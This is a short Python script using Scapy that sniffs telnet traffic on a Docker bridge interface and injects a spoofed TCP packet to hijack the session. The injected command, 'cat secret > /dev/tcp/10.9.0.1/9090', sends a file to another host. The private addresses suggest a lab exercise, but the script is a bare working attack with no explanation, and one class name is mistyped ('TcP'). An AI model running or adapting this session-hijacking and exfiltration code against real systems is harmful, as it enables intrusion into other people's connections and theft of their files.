from scapy.all import *

def spoof_tcp(pkt):
	ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
	tcp = TcP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="A", seq=pkt[TCP].ack+5, ack=pkt[TCP].seq)
	data = "\r cat secret > /dev/tcp/10.9.0.1/9090 \r"
	pkt = ip/tcp/data
	ls(pkt)
	send(pkt, iface="br-b4697936b45b", verbose=0)
	
pkt=sniff(iface='br-b4697936b45b', filter='tcp and src host 10.9.0.5 and src port 23', prn=spoof_tcp)
